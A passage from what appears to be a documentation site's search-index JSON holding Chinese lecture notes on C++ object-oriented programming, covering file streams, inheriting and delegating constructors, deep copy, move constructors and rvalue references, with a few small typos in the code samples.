\u4e00\u822c\u8868\u793a\u6d41\u574f\u6389\u4e86</li> </ul> File streams <pre><code>    ofstream out(argv[2]);\n    if(!out)\n    {\n        cerr &lt;&lt; \"Cannot open \" &lt;&lt; argv[2] &lt;&lt; endl;\n        exit(2);\n    }\n    char c;\n    while(in &gt;&gt; c)\n    {\n        out &lt;&lt; c;\n    }\n}\n</code></pre> More stream operations <ul> <li> <p><code>open(const char *, int flags, int)</code></p> <ul> <li>Open a specific file</li> </ul> <pre><code>ifstream in;\nin.open(\"file.txt\", ios::in);\nif(!in)\n{\n    cerr &lt;&lt; \"Cannot open file.txt\" &lt;&lt; endl;\n\u00b7\u00b7\u00b7\n</code></pre> </li> <li> <p><code>close()</code> \u2014 closes stream</p> </li> </ul>"}, {"location": "Course/OOP/Lec12/#_1", "title": "\u7ee7\u627f\u6784\u9020\u51fd\u6570", "text": "<ul> <li>\u7c7b\u5177\u6709\u53ef\u6d3e\u751f\u6027\uff0c\u6d3e\u751f\u7c7b\u81ea\u52a8\u83b7\u5f97\u57fa\u7c7b\u7684\u6210\u5458\u53d8\u91cf\u548c\u63a5\u53e3\uff08\u865a\u51fd\u6570\u548c\u7eaf\u865a\u51fd\u6570\uff09</li> <li>\u57fa\u7c7b\u7684\u6784\u9020\u51fd\u6570\u4e5f\u6ca1\u6709\u88ab\u7ee7\u627f\uff0c\u56e0\u6b64</li> </ul> <pre><code>class A\n{\npublic:\n    A(int i) { }\n};\n\nclass B : public A\n{\npublic:\n    B(int i) : A(i), d(i) { }\nprivate:\n    int d;\n};\n</code></pre> <ul> <li>B \u7684\u6784\u9020\u51fd\u6570\u8d77\u5230\u4e86\u4f20\u9012\u53c2\u6570\u7ed9 A \u7684\u6784\u9020\u51fd\u6570\u7684\u4f5c\u7528 \uff1a \u900f\u4f20</li> <li>\u5982\u679c A \u5177\u6709\u4e0d\u6b62\u4e00\u4e2a\u6784\u9020\u51fd\u6570\uff0cB \u5f80\u5f80\u8981\u8bbe\u8ba1\u5bf9\u5e94\u7684\u591a\u4e2a\u900f\u4f20</li> </ul>"}, {"location": "Course/OOP/Lec12/#using", "title": "<code>using</code> \u58f0\u660e", "text": "<ul> <li>\u6d3e\u751f\u7c7b\u7528 <code>using</code> \u58f0\u660e\u6765\u4f7f\u57fa\u7c7b\u7684\u6210\u5458\u51fd\u6570\u6210\u4e3a\u81ea\u5df1\u7684<ul> <li>\u89e3\u51b3 <code>name hiding</code> \u95ee\u9898\uff1a\u975e\u865a\u51fd\u6570\u88ab <code>using</code> \u540e\u6210\u4e3a\u6d3e\u751f\u7c7b\u7684\u51fd\u6570</li> <li>\u89e3\u51b3\u6784\u9020\u51fd\u6570\u91cd\u8f7d\u95ee\u9898</li> </ul> </li> </ul> codeexplanation <pre><code>class Base\n{\npublic:\n    void f(double)\n    {\n        cout &lt;&lt; \"double\\n\";\n    }\n};\nclass Dereived : Base // \u4e0d\u662f public \u7ee7\u627f\n{\npublic: \n    using Base:f;\n    void f(int)\n    {\n        cout &lt;&lt; \"int\\n\";\n    }\n};\nint main()\n{\n    Derived d;\n    d.f(4);\n    d.f(4.5);\n    return 0;\n}\n</code></pre> <ul> <li>\u56e0\u4e3a\u6ca1\u6709 <code>public</code> \u7ee7\u627f\uff0c\u5728\u5b50\u7c7b\u4e2d\u7236\u7c7b\u7684 <code>f(double)</code> \u5e76\u4e0d\u5b58\u5728\u3002\u5c31\u7b97\u4f7f\u7528 <code>public</code> \u7ee7\u627f\uff0c\u7531\u4e8e\u91cd\u8f7d\uff0c\u5b50\u7c7b\u4e2d\u8fd8\u662f\u53ea\u6709\u4e00\u4e2a <code>f(int)</code></li> <li>\u56e0\u4e3a <code>using</code> \u7684\u5b58\u5728\uff0c\u5b50\u7c7b\u4e2d\u6709\u4e86\u7236\u7c7b\u7684 <code>f(double)</code></li> </ul>"}, {"location": "Course/OOP/Lec12/#_2", "title": "\u9690\u5f0f\u58f0\u660e", "text": "<pre><code>class A\n{\n    A(int i) { cout &lt;&lt; \"int\\n\"; }\n    A(double d, int i) { }\n    A(float f, char *s) { }\n};\n\nclass B : A\n{\npublic:\n    using A::A;\n};\n\nint main()\n{\n    B b(2);\n}\n</code></pre> <ul> <li>\u7ee7\u627f\u6784\u9020\u51fd\u6570\u662f\u9690\u5f0f\u58f0\u660e\u7684\uff0c\u5982\u679c\u6ca1\u6709\u7528\u5230\u5c31\u4e0d\u4ea7\u751f\u4ee3\u7801</li> <li>\u9690\u5f0f\u58f0\u660e\u7684\u597d\u5904\u5c31\u662f\u4e0d\u7528\u5230\u7684\u5c31\u4e0d\u4ea7\u751f\u5b9e\u9645\u4ee3\u7801\uff0c\u6bd4\u5982\u4e0a\u8ff0\u7a0b\u5e8f\u53ea\u4f1a\u4ea7\u751f <code>A(int i)</code> \u4ee3\u7801</li> <li><code>using A::A</code> \u8868\u793a\u628a\u6240\u6709 A \u90fd\u6d3e\u751f\u6389\uff08<code>using</code> \u4e0d\u7528\u7ed9\u51fa\u53c2\u6570\u8868\uff09</li> </ul> \u9ed8\u8ba4\u53c2\u6570 <ul> <li> <p>\u5982\u679c\u57fa\u7c7b\u7684\u51fd\u6570\u5177\u6709\u9ed8\u8ba4\u53c2\u6570\u503c\uff0c<code>using</code> \u7684\u6d3e\u751f\u7c7b\u65e0\u6cd5\u5f97\u5230\u9ed8\u8ba4\u53c2\u6570\u503c\uff0c\u5c31\u5fc5\u987b\u8f6c\u4e3a\u591a\u4e2a\u91cd\u8f7d\u7684\u51fd\u6570</p> <pre><code>class A\n{\npublic:\n    A(int a = 3, double b = 2.4) { }\n};\n</code></pre> </li> <li> <p>\u5b9e\u9645\u4e0a\u53ef\u4ee5\u88ab\u770b\u505a\u662f\uff1a</p> <pre><code>A(int, double);\nA(int);\nA();\n</code></pre> </li> <li> <p>\u90a3\u4e48\uff0c\u88ab <code>using</code> \u540e\u5c31\u4f1a\u4ea7\u751f\u76f8\u5e94\u7684\u591a\u4e2a\u51fd\u6570</p> </li> <li>\u5373\uff0c\u9ed8\u8ba4\u53c2\u6570\u65e0\u6cd5\u88ab\u6d3e\u751f</li> </ul> <ul> <li>\u591a\u7ee7\u627f\u4e14\u591a\u5904\u7ee7\u627f\u6784\u9020\u51fd\u6570\u65f6\uff0c\u53ef\u80fd\u51fa\u73b0\u7684\u91cd\u8f7d\u51b2\u7a81\u53ea\u80fd\u901a\u8fc7\u4e3b\u52a8\u5b9a\u4e49\u6d3e\u751f\u7c7b\u7684\u6784\u9020\u51fd\u6570\u6765\u89e3\u51b3</li> <li>\u4e0d\u80fd\u58f0\u660e\u7ee7\u627f\u6784\u9020\u51fd\u6570\u7684\u60c5\u51b5\uff1a<ul> <li>\u57fa\u7c7b\u7684\u6784\u9020\u51fd\u6570\u65f6\u79c1\u6709\u7684</li> <li>\u6d3e\u751f\u7c7b\u662f\u4ece\u57fa\u7c7b\u4e2d\u865a\u7ee7\u627f\u7684</li> </ul> </li> <li>\u4e00\u65e6\u58f0\u660e\u4e86\u7ee7\u627f\u6784\u9020\u51fd\u6570\uff0c\u5c31\u4e0d\u4f1a\u518d\u751f\u6210\u81ea\u52a8\u9ed8\u8ba4\u6784\u9020\u51fd\u6570</li> <li>\u81ea\u5df1\u4e3b\u52a8\u5b9a\u4e49\u7684\u6784\u9020\u4f18\u5148\u7ea7\u5927\u4e8e\u7ee7\u627f\u7684</li> </ul>"}, {"location": "Course/OOP/Lec12/#_3", "title": "\u59d4\u6d3e\u6784\u9020\u51fd\u6570", "text": "<ul> <li>\u5982\u679c\u91cd\u8f7d\u7684\u591a\u4e2a\u7248\u672c\u7684\u6784\u9020\u51fd\u6570\u5185\u8981\u505a\u76f8\u540c\u7684\u4e8b\u60c5<ul> <li>\u663e\u7136\u4ee3\u7801\u590d\u5236\u662f\u4e0d\u826f\u8bbe\u8ba1\u7684\u7a81\u51fa\u8868\u73b0</li> <li>\u5728\u6784\u9020\u51fd\u6570\u5185\u8c03\u7528\u67d0\u4e2a\u51fd\u6570\u7684\u95ee\u9898\u662f\u5b83\u53d1\u751f\u5728\u521d\u59cb\u5316\u4e4b\u540e</li> </ul> </li> </ul> <pre><code>class Info\n{\npublic:\n    Info() { Init(); }  // \u76ee\u6807\n    Info(int i) : Info() { type = i;}   // \u59d4\u6d3e\n    Info(char e) : Info() { name = e;}  // \u59d4\u6d3e\n};\n</code></pre> <p>\u76ee\u6807\u6784\u9020\u51fd\u6570\u7684\u6267\u884c\u5148\u4e8e\u59d4\u6d3e\u6784\u9020\u51fd\u6570 \u6784\u9020\u51fd\u6570\u4e0d\u80fd\u540c\u65f6\u59d4\u6d3e\u548c\u521d\u59cb\u5316\u5217\u8868 | \u5728\u6784\u9020\u51fd\u6570\u5185\u8d4b\u503c\u4e0d\u662f\u6700\u597d\u7684\u9009\u62e9 * \u59d4\u6d3e\u5173\u7cfb\u53ef\u4ee5\u5f62\u6210\u94fe\u63a5, \u4f46\u8981\u9632\u6b62\u51fa\u73b0\u5faa\u73af\u94fe\u63a5</p> <pre><code>class Info\n{\npublic:\n    Info() : Info(0, 'a') { } // \u59d4\u6d3e\n    Info(int i) : Info(i, 'a') { } // \u59d4\u6d3e\n    Info(char e) : Info(0, e) { } // \u59d4\u6d3e\nprivate:\n    Info(int i, char e) : type(i), name(e) { } // \u76ee\u6807\n};\n</code></pre>"}, {"location": "Course/OOP/Lec12/#vs", "title": "\u6d45\u62f7\u8d1d VS \u6df1\u62f7\u8d1d", "text": "<ul> <li>\u6d45\u62f7\u8d1d\uff1a\u7f16\u8bd1\u5668\u81ea\u52a8\u4ea7\u751f\u7684\u62f7\u8d1d\u6784\u9020\u51fd\u6570\uff0c\u4f1a\u6267\u884c member-wise copy</li> </ul> <p>\u5f53\u6709\u6210\u5458\u53d8\u91cf\u662f\u6307\u9488\u65f6\uff0c\u8fd9\u79cd\u62f7\u8d1d\u662f\u6709\u5bb3\u7684, \u6240\u4ee5\u5fc5\u987b\u7f16\u5199\u81ea\u5df1\u7684\u62f7\u8d1d\u6784\u9020\u51fd\u6570\u6765\u5b9e\u73b0\u6df1\u62f7\u8d1d</p> Example <pre><code>class C\n{\n    C():i(new int(0)) \n    { \n        cout &lt;&lt; \"none argument constructor called\" &lt;&lt; endl;\n    }\n    // \u589e\u52a0\u6b64\u62f7\u8d1d\u6784\u9020\u51fd\u6570\uff0c\u6839\u636e\u4f20\u5165\u7684 c\uff0cnew \u4e00\u4e2a\u65b0\u7684 int \u7ed9 i \u53d8\u91cf\n    C(const C&amp; c):i(new int(*c.i))\n    {\n        cout &lt;&lt; \"copy constructor called\" &lt;&lt; endl;\n    }\n    ~C()\n    {\n        delete i;\n        cout &lt;&lt; \"destructor called\" &lt;&lt; endl;\n    }\n    int* i;\n};\n</code></pre>"}, {"location": "Course/OOP/Lec12/#_4", "title": "\u79fb\u52a8\u8bed\u4e49", "text": "<ul> <li>\u4f46\u62f7\u8d1d\u51fd\u6570\u4e2d\u4e3a\u6307\u9488\u6210\u5458\u5206\u914d\u65b0\u7684\u5185\u5b58\u518d\u8fdb\u884c\u5185\u5bb9\u62f7\u8d1d\u7684\u65b9\u6cd5\u6709\u65f6\u5019\u4e0d\u662f\u5fc5\u987b\u7684</li> </ul> codeexplanation <pre><code>class HasPtrMem\n{\npublic:\n    HasPtrMem() : d(new int(0))\n    {\n        cout &lt;&lt; \"Construct: \" &lt;&lt; ++n_cstr &lt;&lt; endl;\n    }\n    HasPtrMem(const HasPtrMem&amp; h) \n    {\n        cout &lt;&lt; \"Copy construct: \" &lt;&lt; ++n_cptr &lt;&lt; endl;\n    }\n    ~HasPtrMem()\n    {\n        cout &lt;&lt; \"Destruct: \" &lt;&lt; ++n_dstr &lt;&lt; endl;\n    }\nprivate:\n    int *d;\n    static int n_cstr;\n    static int n_dstr;\n    static int n_cptr;\n};\nint HasPtrMem::n_cstr = 0;\nint HasPtrMem::n_dstr = 0;\nint HasPtrMem::n_cptr = 0;\n\nHasPtrMem GetTemp()\n{\n    return HasPtrMem(); // \u2160\n}\nint main()\n{\n    HasPtrMem a = GetTemp(); // \u2161\n    return 0;\n}\n</code></pre> <ul> <li>\u6784\u9020\u51fd\u6570\u88ab\u8c03\u7528 1 \u6b21\uff0c\u662f\u5728\u2160\u5904\uff0c\u7b2c\u4e00\u6b21\u8c03\u7528\u62f7\u8d1d\u6784\u9020\u51fd\u6570\u662f\u5728 <code>GetTemp</code> return \u7684\u65f6\u5019\uff0c\u5c06\u2160\u751f\u6210\u7684\u53d8\u91cf\u62f7\u8d1d\u6784\u9020\u51fa\u4e00\u4e2a\u4e34\u65f6\u503c\uff0c\u6765\u5f53\u4f5c <code>GetTemp</code> \u7684\u8fd4\u56de\u503c</li> <li>\u7b2c\u4e8c\u6b21\u62f7\u8d1d\u6784\u9020\u51fd\u6570\u662f\u5728\u2161\u5904</li> <li>\u540c\u65f6\u5c31\u6709\u4e86\u4e8e\u6b64\u5bf9\u5e94\u7684\u4e09\u6b21\u6790\u6784\u51fd\u6570\u8c03\u7528</li> <li>\u4f8b\u5b50\u4e2d\u7528\u7684\u662f\u4e00\u4e2a int \u7c7b\u578b\u7684\u6307\u9488\uff0c\u800c\u5982\u679c\u8be5\u6307\u9488\u6307\u5411\u7684\u662f\u975e\u5e38\u5927\u7684\u5806\u5185\u5b58\u6570\u636e\u7684\u8bdd\uff0c\u90a3\u6ca1\u62f7\u8d1d\u8fc7\u7a0b\u5c31\u4f1a\u975e\u5e38\u8017\u65f6\uff0c\u800c\u4e14\u7531\u4e8e\u6574\u4e2a\u884c\u4e3a\u662f\u900f\u660e\u4e14\u6b63\u786e\u7684\uff0c\u5206\u6790\u95ee\u9898\u65f6\u4e5f\u4e0d\u6613\u5bdf\u89c9</li> </ul>"}, {"location": "Course/OOP/Lec12/#_5", "title": "\u79fb\u52a8\u6784\u9020\u51fd\u6570", "text": "<ul> <li>\u901a\u8fc7\u79fb\u52a8\u6784\u9020\u51fd\u6570\u53ef\u4ee5\u89e3\u51b3\u4e0a\u8ff0\u95ee\u9898\uff08\u79fb\u52a8\u6784\u9020\u5c31\u662f\u4e0d\u590d\u5236\u4efb\u4f55\u7684\u5185\u5b58\uff09</li> </ul> \u62f7\u8d1d\u6784\u9020 vs \u79fb\u52a8\u6784\u9020 codeexplanation <pre><code>HasPtrMem(const HasPtrMem&amp; h)\n{\n    cout &lt;&lt; \"Copy construct: \" &lt;&lt; ++n_cptr &lt;&lt; endl;\n}\nHasPteMem(HasPtrMem&amp;&amp; h) : d(h.d)\n{\n    h.d = nullptr;  // \u2162 \u6ce8\u610f\u5bf9\u4e4b\u524d\u7684 h \u8d4b\u7a7a\u6307\u9488\n    cout &lt;&lt; \"Move construct: \" &lt;&lt; ++n_mvtr &lt;&lt; endl;\n}\n</code></pre> <ul> <li>\u901a\u8fc7\u6307\u9488\u8d4b\u503c\u7684\u65b9\u5f0f\uff0c\u5c06 d \u7684\u5185\u5b58\u76f4\u63a5\u201c\u5077\u201d\u8fc7\u6765\uff0c\u907f\u514d\u4e86\u62f7\u8d1d\u6784\u9020\u51fd\u6570\u7684\u8c03\u7528</li> <li>\u6ce8\u610f\u2162\uff0c\u8fd9\u91cc\u9700\u8981\u5bf9\u4e4b\u524d\u7684 h \u8d4b\u7a7a\u6307\u9488\uff0c\u56e0\u4e3a\u5728\u79fb\u52a8\u6784\u9020\u51fd\u6570\u5b8c\u6210\u540e\uff0c\u4e34\u65f6\u5bf9\u8c61\u4f1a\u88ab\u7acb\u5373\u6790\u6784\uff0c\u5982\u679c\u4e0d\u6539\u53d8 d, \u90a3\u4e34\u65f6\u5bf9\u8c61\u88ab\u6790\u6784\u65f6\uff0c\u56e0\u5077\u6765\u7684 d \u548c\u539f\u672c\u7684 d \u6307\u5411\u540c\u4e00\u5757\u5185\u5b58\uff0c\u4f1a\u88ab\u91ca\u653e\uff0c\u6210\u4e3a\u60ac\u6302\u6307\u9488\uff0c\u5bfc\u81f4\u9519\u8bef</li> <li>\u4e3a\u4ec0\u4e48\u4e0d\u7528\u51fd\u6570\u53c2\u6570\u91cc\u5e26\u4e2a\u6307\u9488\u6216\u5f15\u7528\u5f53\u8fd4\u56de\u7ed3\u679c\uff1f \u2014 \u4ee3\u7801\u7f16\u5199\u6548\u7387\u53ca\u53ef\u8bfb\u6027\u5dee</li> </ul> <ul> <li> <p>\u79fb\u52a8\u6784\u9020\u51fd\u6570\u4f55\u65f6\u88ab\u89e6\u53d1\uff1f</p> <ul> <li>\u4e00\u65e6\u7528\u5230\u7684\u662f\u4e2a\u4e34\u65f6\u53d8\u91cf\uff0c\u90a3\u79fb\u52a8\u6784\u9020\u8bed\u4e49\u5c31\u53ef\u4ee5\u5f97\u5230\u6267\u884c</li> </ul> Question <ul> <li>\u5728 C++ \u4e2d\u5982\u4f55\u5224\u65ad\u4ea7\u751f\u4e86\u4e34\u65f6\u5bf9\u8c61\uff1f\u5982\u4f55\u5c06\u5176\u7528\u4e8e\u79fb\u52a8\u6784\u9020\u51fd\u6570\uff1f\u662f\u5426\u53ea\u6709\u4e34\u65f6\u53d8\u91cf\u53ef\u4ee5\u7528\u4e8e\u79fb\u52a8\u6784\u9020\uff1f</li> <li>Answer:<ol> <li>\u5982\u4f55\u5224\u65ad\u4ea7\u751f\u4e86\u4e34\u65f6\u5bf9\u8c61\uff1f \u2014 \u4e34\u65f6\u5bf9\u8c61\u662f\u6307\u5728\u8868\u8fbe\u5f0f\u6c42\u503c\u8fc7\u7a0b\u4e2d\u4ea7\u751f\u7684\u5bf9\u8c61\uff0c\u5b83\u7684\u751f\u547d\u5468\u671f\u4ec5\u4ec5\u662f\u8868\u8fbe\u5f0f\u7684\u6c42\u503c\u8fc7\u7a0b\uff0c\u8868\u8fbe\u5f0f\u6c42\u503c\u7ed3\u675f\u540e\uff0c\u4e34\u65f6\u5bf9\u8c61\u5c31\u4f1a\u88ab\u9500\u6bc1</li> <li>\u5982\u4f55\u5c06\u5176\u7528\u4e8e\u79fb\u52a8\u6784\u9020\u51fd\u6570\uff1f \u2014 \u4e34\u65f6\u5bf9\u8c61\u7684\u751f\u547d\u5468\u671f\u7ed3\u675f\u540e\uff0c\u4f1a\u8c03\u7528\u6790\u6784\u51fd\u6570\uff0c\u800c\u5728\u6790\u6784\u51fd\u6570\u4e2d\uff0c\u4f1a\u8c03\u7528\u79fb\u52a8\u6784\u9020\u51fd\u6570</li> <li>\u662f\u5426\u53ea\u6709\u4e34\u65f6\u53d8\u91cf\u53ef\u4ee5\u7528\u4e8e\u79fb\u52a8\u6784\u9020\uff1f \u2014 \u4e0d\u662f\uff0c\u53ea\u8981\u662f\u5c06\u8981\u88ab\u9500\u6bc1\u7684\u5bf9\u8c61\uff0c\u90fd\u53ef\u4ee5\u7528\u4e8e\u79fb\u52a8\u6784\u9020</li> </ol> </li> </ul> </li> </ul>"}, {"location": "Course/OOP/Lec12/#_6", "title": "\u5de6\u503c\u3001\u53f3\u503c\u548c\u53f3\u503c\u5f15\u7528", "text": "<p>\u4e4b\u524d\u63d0\u8fc7\u4e00\u70b9 \u8df3\u8f6c\u9875\u6700\u4e0b\u9762</p> <ul> <li>\u5728\u8d4b\u503c\u8868\u8fbe\u5f0f\u4e2d\uff0c\u51fa\u73b0\u5728\u7b49\u53f7\u5de6\u8fb9\u7684\u5c31\u662f\u201c\u5de6\u503c\u201d\uff0c\u800c\u5728\u7b49\u53f7\u53f3\u8fb9\u7684\uff0c\u5c31\u662f\u201c\u53f3\u503c\u201d</li> <li>\u53ef\u4ee5\u53d6\u5730\u5740\u7684\u3001\u6709\u540d\u5b57\u7684\u5c31\u662f\u5de6\u503c\uff0c\u53cd\u4e4b\u5c31\u662f\u53f3\u503c</li> <li>\u5728 C++11 \u4e2d\uff0c\u53f3\u503c\u662f\u7531\u4e24\u4e2a\u6982\u5ff5\u6784\u6210\u7684\uff0c\u4e00\u4e2a\u662f\u5c06\u4ea1\u503c\uff08xvalue, eXpiring, Value\uff09, \u53e6\u4e00\u4e2a\u5219\u662f\u7eaf\u53f3\u503c\uff08prvalue, Pure Rvalue\uff09</li> </ul> <p>\u7eaf\u53f3\u503c vs \u5c06\u4ea1\u503c</p> <ul> <li>\u7eaf\u53f3\u503c\u662f C++98 \u6807\u51c6\u4e2d\u53f3\u503c\u7684\u6982\u5ff5\uff0c\u8bb2\u7684\u662f\u7528\u4e8e\u8fa8\u8bc6\u4e34\u65f6\u53d8\u91cf\u548c\u4e00\u4e9b\u4e0d\u8ddf\u5bf9\u8c61\u5173\u8054\u7684\u503c\u3002\u6bd4\u5982\u975e\u5f15\u7528\u8fd4\u56de\u7684\u51fd\u6570\u8fd4\u56de\u7684\u4e34\u65f6\u53d8\u91cf\u503c\u5c31\u662f\u4e00\u4e2a\u7eaf\u53f3\u503c\u3002<ul> <li>\u4e00\u4e9b\u8fd0\u7b97\u8868\u8fbe\u5f0f\uff0c\u6bd4\u5982 <code>1 + 2</code> \u4ea7\u751f\u7684\u4e34\u65f6\u53d8\u91cf\u503c\u4e5f\u662f\u7eaf\u53f3\u503c</li> <li>\u800c\u4e0d\u8ddf\u5bf9\u8c61\u5173\u8054\u7684\u5b57\u9762\u91cf\u503c\uff0c\u6bd4\u5982\uff1a<code>1</code>, <code></code>a<code></code>, <code>true</code> \u4e5f\u662f\u7eaf\u53f3\u503c</li> <li>\u6b64\u5916\uff0c\u7c7b\u578b\u8f6c\u6362\u51fd\u6570\u7684\u8fd4\u56de\u503c\uff0clambda \u8868\u8fbe\u5f0f\u7b49\uff0c\u4e5f\u90fd\u662f\u53f3\u503c</li> </ul> </li> <li>\u5c06\u4ea1\u503c\u5219\u662f C++11 \u65b0\u589e\u7684\u8ddf\u53f3\u503c\u5f15\u7528\u76f8\u5173\u7684\u8868\u8fbe\u5f0f\uff0c\u8fd9\u6837\u8868\u8fbe\u5f0f\u901a\u5e38\u662f\u5c06\u8981\u88ab\u79fb\u52a8\u7684\u5bf9\u8c61\uff08\u79fb\u4e3a\u4ed6\u7528\uff09\uff0c\u6bd4\u5982\u8fd4\u56de\u53f3\u503c\u5f15\u7528 <code>T&amp;&amp;</code> \u7684\u51fd\u6570\u8fd4\u56de\u503c\uff0c<code>std::move</code> \u7684\u8fd4\u56de\u503c\uff0c\u6216\u8005\u8f6c\u6362\u4e3a <code>T&amp;&amp;</code> \u7684\u7c7b\u578b\u8f6c\u6362\u51fd\u6570\u7684\u8fd4\u56de\u503c\u7b49</li> </ul>"}, {"location": "Course/OOP/Lec12/#_7", "title": "\u53f3\u503c\u5f15\u7528", "text": "<ul> <li>\u53f3\u503c\u5f15\u7528\u5c31\u662f\u5bf9\u4e00\u4e2a\u53f3\u503c\u8fdb\u884c\u5f15\u7528\u7684\u7c7b\u578b\u3002\u7531\u4e8e\u53f3\u503c\u901a\u5e38\u4e0d\u5177\u6709\u540d\u5b57\uff0c\u6211\u4eec\u4e5f\u53ea\u80fd\u901a\u8fc7\u5f15\u7528\u7684\u65b9\u5f0f\u627e\u5230\u5b83\u7684\u5b58\u5728\u3002\u901a\u5e38\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u53ea\u80fd\u4ece\u53f3\u503c\u8868\u8fbe\u5f0f\u83b7\u5f97\u5176\u5f15\u7528<ul> <li>\u6bd4\u5982\uff1a<code>T&amp;&amp; a = ReturnRvalue();</code></li> <li>\u5728\u8fd9\u4e2a\u8868\u8fbe\u5f0f\u4e2d\uff0c\u5047\u8bbe <code>ReturnRvalue()</code> \u8fd4\u56de\u4e00\u4e2a\u53f3\u503c\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u58f0\u660e\u4e86\u4e00\u4e2a\u540d\u4e3a <code>a</code> \u7684\u53f3\u503c\u5f15\u7528\uff0c\u5176\u503c\u7b49\u4e8e <code>ReturnRvalue()</code> \u7684\u8fd4\u56de\u7684\u4e34\u65f6\u53d8\u91cf\u7684\u503c</li> </ul> </li> <li>\u53f3\u503c\u5f15\u7528\u548c\u5de6\u503c\u5f15\u7528\u90fd\u5c5e\u4e8e\u5f15\u7528\u7c7b\u578b\u3002\u65e0\u8bba\u662f\u58f0\u660e\u4e00\u4e2a\u5de6\u503c\u5f15\u7528\u8fd8\u662f\u53f3\u503c\u5f15\u7528\uff0c\u90fd\u5fc5\u987b\u7acb\u5373\u8fdb\u884c\u521d\u59cb\u5316\u3002\u56e0\u5f15\u7528\u7c7b\u578b\u672c\u8eab\u5e76\u4e0d\u62e5\u6709\u6240\u7ed1\u5b9a\u5bf9\u8c61\u7684\u5185\u5b58\uff0c\u53ea\u662f\u4e00\u4e2a\u522b\u540d\u800c\u5df2\u3002\uff08\u5de6\u503c\u5f15\u7528\u662f\u5177\u540d\u53d8\u91cf\u503c\u7684\u522b\u540d\uff0c\u53f3\u503c\u5f15\u7528\u662f \u4e0d\u5177\u540d/\u533f\u540d \u53d8\u91cf\u7684\u522b\u540d\uff09</li> </ul> example <ul> <li><code>T&amp;&amp; a = ReturnRvalue();</code> <ul> <li><code>ReturnRvalue()</code> \u51fd\u6570\u8fd4\u56de\u7684\u53f3\u503c\u5728\u8868\u8fbe\u5f0f\u8bed\u53e5\u7ed3\u675f\u540e\uff0c\u5176\u751f\u547d\u4e5f\u5c31\u7ec8\u7ed3\u4e86\uff08\u901a\u5e38\u6211\u4eec\u4e5f\u79f0\u5176\u5177\u6709\u8868\u8fbe\u5f0f\u751f\u547d\u671f\uff09\uff0c\u800c\u901a\u8fc7\u53f3\u503c\u5f15\u7528\u7684\u58f0\u660e\uff0c\u8be5\u53f3\u503c\u7684\u751f\u547d\u5468\u671f\u5c06\u540c\u53f3\u503c\u5f15\u7528\u7c7b\u578b\u53d8\u91cf <code>a</code> \u7684\u751f\u547d\u671f\u4e00\u6837</li> </ul> </li> <li>\u6545\u76f8\u6bd4 <code>T  b = ReturnRvalue();</code><ul> <li>\u53f3\u503c\u5f15\u7528\u53d8\u91cf\u58f0\u660e\u5c31\u4f1a\u5c11\u4e00\u6b21\u5bf9\u8c61\u7684\u6790\u6784\u53ca\u4e00\u6b21\u5bf9\u8c61\u7684\u6784\u9020\u3002\u56e0\u4e3a <code>a</code> \u76f4\u63a5\u7ed1\u5b9a\u4e86 <code>ReturnRvalue()</code> \u8fd4\u56de\u7684\u4e34\u65f6\u503c\uff0c\u800c <code>b</code> \u53ea\u662f\u7531\u4e34\u65f6\u503c\u6784\u9020\u7684\uff0c\u800c\u4e34\u65f6\u503c\u5728\u8868\u8fbe\u5f0f\u7ed3\u675f\u540e\u4f1a\u6790\u6784\u56e0\u6b64\u5c31\u4f1a\u591a\u4e00\u6b21\u6790\u6784\u548c\u6784\u9020\u7684\u5f00\u9500</li> <li>\u80fd\u591f\u58f0\u660e\u53f3\u503c\u5f15\u7528 <code>a</code> \u7684\u524d\u63d0\u662f <code>ReturnRvalue()</code> \u8fd4\u56de\u7684\u662f\u4e00\u4e2a\u53f3\u503c\u3002\u901a\u5e38\u60c5\u51b5\u4e0b\uff0c\u53f3\u503c\u5f15\u7528\u662f\u4e0d\u80fd\u591f\u7ed1\u5b9a\u5230\u4efb\u4f55\u5de6\u503c\u7684\u3002</li> </ul> </li> </ul> More questionexplanation <p>\u76f8\u5bf9\u7684\uff0c\u5728 C++98 \u6807\u51c6\u4e2d\u5c31\u5df2\u7ecf\u51fa\u73b0\u7684\u5de6\u503c\u5f15\u7528\u662f\u5426\u53ef\u4ee5\u7ed1\u5b9a\u5230\u53f3\u503c\uff08\u7531\u53f3\u503c\u8fdb\u884c\u521d\u59cb\u5316\uff09\u5462\uff1f\u6bd4\u5982\uff1a</p> <pre><code>T&amp; e = ReturnRvalue();\nconst T&amp; f = ReturnRvalue();\n</code></pre> <ul> <li><code>e</code> \u7684\u521d\u59cb\u5316\u4f1a\u5bfc\u81f4\u7f16\u8bd1\u65f6\u9519\u8bef\uff0c\u800c <code>f</code> \u4e0d\u4f1a</li> </ul> <pre><code>T&amp; e = ReturnRvalue();\nconst T&amp; f = ReturnRvalue();\n</code></pre> <ul> <li>\u5e38\u91cf\u5de6\u503c\u5f15\u7528\u5728 C++98 \u6807\u51c6\u4e2d\u5f00\u59cb\u5c31\u662f\u4e2a\u201c\u4e07\u80fd\u201d\u7684\u5f15\u7528\u7c7b\u578b</li> <li>\u53ef\u4ee5\u63a5\u53d7\u975e\u5e38\u91cf\u5de6\u503c\u3001\u5e38\u91cf\u5de6\u503c\u3001\u53f3\u503c\u5bf9\u5176\u8fdb\u884c\u521d\u59cb\u5316</li> <li>\u800c\u4e14\u5728\u4f7f\u7528\u53f3\u503c\u5bf9\u5176\u521d\u59cb\u5316\u65f6\uff0c\u5e38\u91cf\u5de6\u503c\u5f15\u7528\u8fd8\u53ef\u4ee5\u50cf\u53f3\u503c\u5f15\u7528\u4e00\u6837\u5c06\u53f3\u503c\u7684\u751f\u547d\u671f\u5ef6\u957f</li> <li>\u76f8\u6bd4\u4e8e\u53f3\u503c\u5f15\u7528\u6240\u5f15\u7528\u7684\u53f3\u503c\uff0c\u5e38\u91cf\u5de6\u503c\u6240\u5e94\u7528\u7684\u53f3\u503c\u5728\u5176\u751f\u547d\u671f\u4e2d\u662f\u53ea\u8bfb\u6743\u9650</li> <li>\u76f8\u5bf9\u7684\uff0c\u975e\u5e38\u91cf\u5de6\u503c\u53ea\u80fd\u63a5\u53d7\u975e\u5e38\u91cf\u5de6\u503c\u5bf9\u5176\u521d\u59cb\u5316</li> </ul>"}, {"location": "Course/OOP/Lec12/#stdmove", "title": "<code>std::move()</code>", "text": "<ul> <li>\u5728 C++11 \u4e2d\uff0c \u4e2d\u63d0\u4f9b\u4e86\u51fd\u6570 